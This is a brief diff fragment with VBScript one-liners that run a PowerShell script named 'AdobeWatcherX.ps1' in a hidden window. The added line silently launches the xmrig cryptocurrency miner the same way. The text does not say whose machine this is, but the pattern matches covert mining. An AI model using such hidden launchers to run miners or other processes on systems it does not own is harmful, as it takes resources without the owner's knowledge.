@@ -30,3 +30,6 @@
   vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""'C:\Program Files\PowerShell\7\pwsh.exe' -NoLogo -Command """"& 'D:\temp\coins\AdobeWatcherX.ps1'"""""", 0 : window.close")
   
   vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& 'D:\temp\coins\AdobeWatcherX.ps1'"""""", 0 : window.close")
+  
+  
+  vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""D:\temp\awatcher\xmrig\xmrig.exe"", 0 : window.close")
